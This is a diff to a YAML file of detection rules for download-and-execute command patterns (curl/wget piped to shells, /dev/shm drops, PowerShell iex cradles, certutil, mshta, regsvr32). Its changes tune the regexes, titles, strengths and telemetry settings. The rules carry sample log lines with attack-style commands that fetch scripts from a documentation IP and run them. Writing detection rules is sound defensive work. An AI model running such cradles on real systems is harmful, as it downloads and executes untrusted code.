@@ -5,9 +5,9 @@
 # chmod-and-run, a script engine pointed at a URL).
 
 - id: mention.cradle_raw_ip_http_to_interpreter
-  title: Content from an http:// raw IP address piped into a shell, interpreter or iex
+  title: 'http:// raw-IP URL with a pipe into a shell or iex'
   match:
-    anchored: 'http://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|python[23]?|perl|iex|Invoke-Expression)\b'
+    anchored: 'http://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|iex|Invoke-Expression)\b'
   case_sensitive: false
   strength: strong
   attack: [T1105, T1059.004, T1059.001]
@@ -18,9 +18,12 @@
     license: DRL-1.1
     upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
   rationale: >-
-    Narrows the rule's pipe-to-shell shape to a plain-HTTP URL whose host is an IP address. Vendor install scripts are
-    served from named HTTPS hosts; botnet loaders, exploit payloads and hands-on intruders fetch from bare IPs. An
-    internal mirror addressed by IP is the known benign case.
+    Narrows the rule's pipe-to-shell shape to a plain-HTTP URL whose host is an IP address, piped into a shell or
+    PowerShell's iex. Vendor install scripts are served from named HTTPS hosts; botnet loaders, exploit payloads and
+    hands-on intruders fetch from bare IPs over plain HTTP. Pipes into python or perl are not matched because 'curl
+    http://<ip>:9200/... | python3 -m json.tool' and instance-metadata queries are everyday admin idioms. An internal
+    installer served by IP over plain HTTP is the known benign case and stays strong by choice: it is rare and worth a
+    look.
   examples:
     positive:
       - 'Nov 20 11:00:00 web01 bash[6000]: HISTORY: curl -s http://203.0.113.7/x.sh | sh'
@@ -31,11 +34,11 @@
       - 'Nov 20 11:00:03 mon01 bash[6002]: HISTORY: curl -s http://10.0.0.5:9100/metrics | grep node_load'
 
 - id: mention.cradle_raw_ip_https_to_interpreter
-  title: Content from an https:// raw IP address piped into a shell, interpreter or iex
+  title: 'https:// raw-IP URL with a pipe into a shell or iex'
   match:
-    anchored: 'https://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|python[23]?|perl|iex|Invoke-Expression)\b'
+    anchored: 'https://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|iex|Invoke-Expression)\b'
   case_sensitive: false
-  strength: strong
+  strength: medium
   attack: [T1105, T1059.004, T1059.001]
   telemetry: [any]
   source:
@@ -44,8 +47,9 @@
     license: DRL-1.1
     upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
   rationale: >-
-    The HTTPS form of the raw-IP cradle; a certificate for a bare IP is unusual for a vendor, so the reasoning is the
-    same as for plain HTTP.
+    The HTTPS form of the raw-IP cradle, piped into a shell or iex. Configuration-management agents are bootstrapped
+    this way from internal servers by IP (Puppet's 'curl -k https://<ip>:8140/packages/current/install.bash | sudo
+    bash'), so it is medium; plain-HTTP raw-IP cradles are the strong entry.
   examples:
     positive:
       - 'Nov 20 11:01:00 web01 bash[6003]: HISTORY: curl -k https://203.0.113.7:8443/s | bash'
@@ -54,7 +58,7 @@
       - 'Nov 20 11:01:02 web01 bash[6005]: HISTORY: curl -fsSL https://sh.rustup.rs | sh -s -- -y'
 
 - id: mention.cradle_curl_pipe_shell
-  title: curl output piped into a shell
+  title: 'curl with a pipe into a shell'
   match:
     anchored: 'curl [^\n|]{0,300}\| {0,3}(?:sudo )?(?:-E )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
   case_sensitive: false
@@ -68,7 +72,7 @@
     upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
   rationale: >-
     Any 'curl ... | sh'. It is how droppers run, but also how Docker, rustup, nvm, k3s and many other tools are
-    installed, so it is context only; the host in the URL decides.
+    installed, so it is a weak candidate; the host in the URL decides.
   examples:
     positive:
       - 'Nov 20 11:02:00 web01 bash[6006]: HISTORY: curl -fsSL https://get.docker.com | sh'
@@ -77,7 +81,7 @@
       - 'Nov 20 11:02:02 web01 bash[6008]: HISTORY: curl -s https://api.example.org/v1/status | jq .'
 
 - id: mention.cradle_wget_pipe_shell
-  title: wget output piped into a shell
+  title: 'wget with a pipe into a shell'
   match:
     anchored: 'wget [^\n|]{0,300}\| {0,3}(?:sudo )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
   case_sensitive: false
@@ -91,7 +95,7 @@
     upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
   rationale: >-
     Any 'wget -O- ... | sh'. Same reasoning as the curl entry: droppers and some installers both do it, so it is
-    context only.
+    a weak candidate.
   examples:
     positive:
       - 'Nov 20 11:03:00 web01 bash[6009]: HISTORY: wget -qO- https://install.example.org/agent.sh | sudo bash'
@@ -100,7 +104,7 @@
       - 'Nov 20 11:03:02 web01 bash[6011]: HISTORY: wget -qO- https://repo.example.org/key.asc | gpg --dearmor'
 
 - id: mention.cradle_curl_chmod_run
-  title: curl download, chmod and run from a temp directory in one command line
+  title: 'curl, chmod and temp-directory execution text in one command line'
   match:
     anchored: 'curl [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{0,40}(?:/tmp/|/var/tmp/|/dev/shm/)[^\n]{0,100}(?:;|&&) {0,2}(?:nohup )?(?:/tmp/|/var/tmp/|/dev/shm/)'
   case_sensitive: false
@@ -125,7 +129,7 @@
       - 'Nov 20 11:04:03 web01 bash[6015]: HISTORY: curl -s https://api.example.org/v1/status'
 
 - id: mention.cradle_wget_chmod_run
-  title: wget download, chmod and run from a temp directory in one command line
+  title: 'wget, chmod and temp-directory execution text in one command line'
   match:
     anchored: 'wget [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{0,40}(?:/tmp/|/var/tmp/|/dev/shm/)[^\n]{0,100}(?:;|&&) {0,2}(?:nohup )?(?:/tmp/|/var/tmp/|/dev/shm/)'
   case_sensitive: false
@@ -148,7 +152,7 @@
       - 'Nov 20 11:05:02 web01 bash[6017]: HISTORY: wget -q https://mirror.example.org/sha256sums.txt'
 
 - id: mention.cradle_download_chmod_run_cwd
-  title: curl or wget download, chmod and run from the current directory or a shell
+  title: 'chmod then ./ or shell invocation text in one command line'
   match:
     anchored: 'chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{1,100}(?:;|&&) {0,2}(?:\./|nohup \./|sh |bash )'
   case_sensitive: false
@@ -162,7 +166,7 @@
     upstream_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
   rationale: >-
     Making a file executable and running it on the same line ('chmod +x x; ./x'). Droppers do this after cd /tmp,
-    and so do official bootstrap scripts (helm, k3s) and developers, so it is context only; the temp-directory
+    and so do official bootstrap scripts (helm, k3s) and developers, so it is a weak candidate; the temp-directory
     entries are the strong form.
   examples:
     positive:
@@ -172,7 +176,7 @@
       - 'Nov 20 11:05:05 web01 bash[6024]: HISTORY: chmod 600 ~/.ssh/id_ed25519'
 
 - id: mention.cradle_chmod_exec_in_dev_shm
-  title: File in /dev/shm made executable
+  title: 'chmod execute mode on a /dev/shm path'
   match:
     anchored: 'chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}/dev/shm/'
   case_sensitive: false
@@ -195,11 +199,11 @@
       - 'Nov 20 11:06:02 web01 bash[6019]: HISTORY: df -h /dev/shm'
 
 - id: mention.cradle_cd_dev_shm
-  title: Working directory changed to /dev/shm
+  title: 'cd /dev/shm command text'
   match:
     literal: ['cd /dev/shm']
   case_sensitive: false
-  strength: weak
+  strength: medium
   attack: [T1059.004]
   telemetry: [linux_text]
   source:
@@ -208,8 +212,8 @@
     license: DRL-1.1
     upstream_id: 5cd16c8f-44a6-4654-81e7-a84d6db507d4
   rationale: >-
-    Intruders move into /dev/shm before dropping payloads because it is writable and memory-backed. Admins rarely cd
-    there, but do while debugging IPC, so it is context only.
+    Intruders move into /dev/shm before dropping payloads because it is writable and memory-backed; administrators
+    rarely change into it except while debugging IPC, so it is medium.
   examples:
     positive:
       - 'Nov 20 11:07:00 web01 bash[6020]: HISTORY: cd /dev/shm; wget http://203.0.113.7/a'
@@ -224,7 +228,7 @@
   case_sensitive: false
   strength: medium
   attack: [T1105, T1059.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
@@ -248,7 +252,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1105, T1059.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
@@ -265,7 +269,7 @@
       - 'powershell -c "$wc.DownloadFile(''http://10.0.0.5/tools/agent.msi'', ''C:\Temp\agent.msi'')"'
 
 - id: mention.cradle_ps_iex_download_prefix
-  title: PowerShell iex wrapped around a web download
+  title: 'PowerShell iex around a web download'
   match:
     literal:
       - 'iex(new-object net.webclient)'
@@ -289,7 +293,7 @@
   case_sensitive: false
   strength: medium
   attack: [T1105, T1059.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
@@ -308,13 +312,13 @@
       - 'powershell -c "irm https://api.example.org/v1/status | ConvertTo-Json"'
 
 - id: mention.cradle_ps_invoke_web_to_iex
-  title: Invoke-WebRequest or Invoke-RestMethod piped into iex
+  title: 'Invoke-WebRequest or Invoke-RestMethod with a pipe into iex'
   match:
     anchored: 'Invoke-(?:WebRequest|RestMethod) [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
   case_sensitive: false
   strength: medium
   attack: [T1105, T1059.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
@@ -331,13 +335,13 @@
       - 'powershell -c "Invoke-RestMethod https://api.example.org/v1/items | Select-Object -First 5"'
 
 - id: mention.cradle_ps_iwr_to_iex
-  title: iwr alias piped into iex
+  title: 'iwr alias with a pipe into iex'
   match:
     anchored: 'iwr [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
   case_sensitive: false
   strength: medium
   attack: [T1105, T1059.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
@@ -353,13 +357,13 @@
       - 'powershell -c "iwr https://api.example.org/health | Select-Object StatusCode"'
 
 - id: mention.cradle_ps_irm_to_iex
-  title: irm alias piped into iex
+  title: 'irm alias with a pipe into iex'
   match:
     anchored: 'irm [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
   case_sensitive: false
   strength: medium
   attack: [T1105, T1059.001]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
@@ -382,7 +386,7 @@
   case_sensitive: false
   strength: medium
   attack: [T1105, T1218]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Suspicious Download Via Certutil.EXE (Florian Roth, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_certutil_download.yml
@@ -405,7 +409,7 @@
   case_sensitive: false
   strength: medium
   attack: [T1140]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: LOLBAS project, Certutil.exe
     url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Certutil.yml
@@ -428,7 +432,7 @@
   case_sensitive: false
   strength: medium
   attack: [T1197, T1105]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: File Download Via Bitsadmin (Michael Haag, FPT.EagleEye)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml
@@ -451,7 +455,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1218.005, T1105]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Remotely Hosted HTA File Executed Via Mshta.EXE (Nasreddine Bencherchali, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_mshta_http.yml
@@ -474,7 +478,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1218.005, T1059.005, T1059.007]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: LOLBAS project, Mshta.exe
     url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Mshta.yml
@@ -498,7 +502,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1218.010, T1105]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Potentially Suspicious Regsvr32 HTTP/FTP Pattern (Florian Roth, Nextron Systems)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
@@ -522,7 +526,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1218.011, T1059.007]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: LOLBAS project, Rundll32.exe
     url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Rundll32.yml
@@ -545,7 +549,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1218.011]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: LOLBAS project, Rundll32.exe
     url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Rundll32.yml
@@ -568,7 +572,7 @@
   case_sensitive: false
   strength: strong
   attack: [T1220, T1047]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: 'SigmaHQ: Potential Remote SquiblyTwo Technique Execution (Markus Neis, Florian Roth, Swachchhanda Shrawan Poudel)'
     url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_wmic_squiblytwo_bypass.yml
@@ -592,7 +596,7 @@
   case_sensitive: false
   strength: medium
   attack: [T1218.007, T1105]
-  telemetry: [windows_text]
+  telemetry: [any]
   source:
     name: LOLBAS project, Msiexec.exe
     url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Msiexec.yml
